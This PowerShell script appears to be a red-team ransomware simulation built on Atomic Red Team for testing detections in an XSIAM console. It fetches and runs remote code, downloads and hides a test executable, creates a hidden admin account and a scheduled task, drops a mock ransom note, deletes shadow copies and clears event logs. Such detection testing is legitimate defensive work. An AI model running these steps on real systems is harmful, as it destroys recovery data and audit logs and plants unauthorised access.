# Simple Ransomware Simulation Script

# VARIABLES
# sleep between phases, how long the script will wait between the phases in seconds
param(
    [int]$DelayBetweenPhases = 120
)

# ransomware payload path
# exe of ransomware payload - for example download the wildfire sample file, and put it in C:\AttackLocation
# url of the malware file to download, in this case the wildfire sample file.
$exePath = "C:\AttackLocation\ransomware.exe"
$malwareUrl = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"

Write-Host "=== Ransomware Simulation Demo ===" -ForegroundColor Yellow

# Check for Administrator privileges
Write-Host "Checking for Admin...." -ForegroundColor Green

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Re-launch the script with elevated privileges
    Write-Host "Relaunching with Admin! This window will close in 30 seconds..." -ForegroundColor Green
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Read-Host -Prompt "Press Enter to exit"
    Exit  
}

# The rest of your script's code goes here, which will only run if the script has admin privileges.
Write-Host "This script is running with administrator privileges." -ForegroundColor Yellow

# Check if Atomic Red Team is already installed
Write-Host "Checking Atomic Red Team installation..." -ForegroundColor Cyan

$AtomicPath = "C:\AtomicRedTeam"
$ModulePath = "$AtomicPath\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"

if (Test-Path $ModulePath) {
    Write-Host "Atomic Red Team found, importing module..." -ForegroundColor Green
    Import-Module $ModulePath -Force
} else {
    Write-Host "Installing Atomic Red Team..." -ForegroundColor Yellow
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
    Install-AtomicRedTeam -getAtomics -Force
    Import-Module $ModulePath -Force
}

# Verify Atomic Red Team is working
try {
    Invoke-AtomicTest T1082 -TestNumbers 1 | Out-Null
    Write-Host "Atomic Red Team is ready" -ForegroundColor Green
} catch {
    Write-Error "Atomic Red Team not working properly. Exiting."
    exit 1
}

Write-Host "Starting ransomware simulation in 5 seconds..." -ForegroundColor Yellow
Start-Sleep 5

# Phase 1: Discovery
Write-Host "`n=== Phase 1: Discovery ===" -ForegroundColor Cyan

# T1082 - System Information Discovery
Write-Host "Executing T1082 - System Information Discovery" -ForegroundColor Gray
# Check prerequisites first
$prereqCheck = Invoke-AtomicTest T1082 -TestNumbers 1 -CheckPrereqs
if ($prereqCheck -match "Prerequisites not met") {
    Write-Host "    Getting prerequisites for T1082..." -ForegroundColor Yellow
    Invoke-AtomicTest T1082 -TestNumbers 1 -GetPrereqs
}
Invoke-AtomicTest T1082 -TestNumbers 1

# T1087.001 - Local Account Discovery (Manual)
Write-Host "`nExecuting T1087.001 - Local Account Discovery (Manual)" -ForegroundColor Gray
Write-Host "    Enumerating local accounts..." -ForegroundColor DarkGray
net user

Write-Host "    Getting detailed user information..." -ForegroundColor DarkGray
Get-LocalUser | Format-Table Name, Enabled, LastLogon -AutoSize

Write-Host "    Checking local group membership..." -ForegroundColor DarkGray
Get-LocalGroupMember -Group "Users" -ErrorAction SilentlyContinue | Format-Table
Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue | Format-Table

Write-Host "    Examining user directories..." -ForegroundColor DarkGray
Get-ChildItem C:\Users\ | Select-Object Name, CreationTime | Format-Table

Write-Host "    Checking stored credentials..." -ForegroundColor DarkGray
cmdkey.exe /list

Write-Host "Phase 1 Discovery completed" -ForegroundColor Green
Start-Sleep $DelayBetweenPhases

# Phase 2: Persistence
Write-Host "`n=== Phase 2: Persistence ===" -ForegroundColor Cyan

Write-Host "Executing T1053.005 - Scheduled Task Creation" -ForegroundColor Gray
# Check prerequisites for T1053.005
$prereqCheck = Invoke-AtomicTest T1053.005 -TestNumbers 1 -CheckPrereqs
if ($prereqCheck -match "Prerequisites not met") {
    Write-Host "    Getting prerequisites for T1053.005..." -ForegroundColor Yellow
    Invoke-AtomicTest T1053.005 -TestNumbers 1 -GetPrereqs
}
Invoke-AtomicTest T1053.005 -TestNumbers 1

# T1136.001 - Create Local Account
Write-Host "Executing T1136.001 - Hidden Admin Account Creation" -ForegroundColor Gray
$prereqCheck = Invoke-AtomicTest T1136.001 -TestNumbers 5 -CheckPrereqs
if ($prereqCheck -match "Prerequisites not met") {
    Write-Host "    Getting prerequisites for T1136.001..." -ForegroundColor Yellow
    Invoke-AtomicTest T1136.001 -TestNumbers 5 -GetPrereqs
}
Invoke-AtomicTest T1136.001 -TestNumbers 5

Write-Host "Phase 2 Persistence completed" -ForegroundColor Green
Start-Sleep $DelayBetweenPhases

# Phase 3: Impact
Write-Host "`n=== Phase 3: Impact ===" -ForegroundColor Red

Write-Host "`nExecuting Ransomware Payload" -ForegroundColor Gray

# Create place for the malware executable
if (!(Test-Path "C:\AttackLocation")) {
    New-Item -Path "C:\AttackLocation" -ItemType Directory
}

# download malware sample file.
Invoke-WebRequest -Uri $malwareUrl -OutFile $exePath

if (Test-Path $exePath) {
    Start-Process $exePath -WindowStyle Hidden
    Write-Host "    Payload executed: $exePath" -ForegroundColor Red
}

Write-Host "Executing T1491.001 - Creating Ransom Note" -ForegroundColor Gray
# Create custom ransom note for DOCX files
$ransomNote = @"
YOUR DOCX FILES HAVE BEEN ENCRYPTED!

All your important documents (.docx files) have been encrypted with military-grade encryption.

To recover your files, contact: recovery@evil.com
Payment required: 1 BTC

DO NOT attempt to decrypt files yourself or use recovery software.
This will result in permanent data loss.

This is a SIMULATION for security testing purposes.
"@

Write-Host "    Creating ransom notes..." -ForegroundColor Gray
$ransomNoteLocations = @(
    "C:\AttackLocation\README_DECRYPT.txt",
    "$env:PUBLIC\Desktop\README_DECRYPT.txt"
)

foreach ($ransomeNoteLocation in $ransomNoteLocations) {
    $ransomNote | Out-File $ransomeNoteLocation
    Write-Host "  Ransom note created: $ransomeNoteLocation" -ForegroundColor Green
}

Write-Host "`nExecuting Ransomware Payload" -ForegroundColor Gray
if (Test-Path $exePath) {
    Start-Process $exePath -WindowStyle Hidden
    Write-Host "  Payload executed: $exePath" -ForegroundColor Green
}

Write-Host "Executing T1490 - Inhibit System Recovery - Delete Volume Shadow Copies" -ForegroundColor Gray
Invoke-AtomicTest T1490 -TestNumbers 1

Write-Host "Phase 3 Impact completed" -ForegroundColor Green

# Phase 4: Defense Evasion and Cover Tracks
Write-Host "`n=== Phase 4: Defense Evasion and Cover Tracks ===" -ForegroundColor Red

# T1070.001 - Clear Windows Event Logs
Write-Host "Executing T1070.001 - Security Log Clearing" -ForegroundColor Gray
$prereqCheck = Invoke-AtomicTest T1070.001 -TestNumbers 1 -CheckPrereqs
if ($prereqCheck -match "Prerequisites not met") {
    Write-Host "  Getting prerequisites for T1070.001..." -ForegroundColor Yellow
    Invoke-AtomicTest T1070.001 -TestNumbers 1 -GetPrereqs
}
Invoke-AtomicTest T1070.001 -TestNumbers 1

Write-Host "Phase 4 Defense Evasion and Cover Tracks completed" -ForegroundColor Green

Write-Host "`n=== Ransomware Simulation Complete! ===" -ForegroundColor Yellow
Write-Host "Check your XSIAM console for detection alerts" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to exit"
Exit  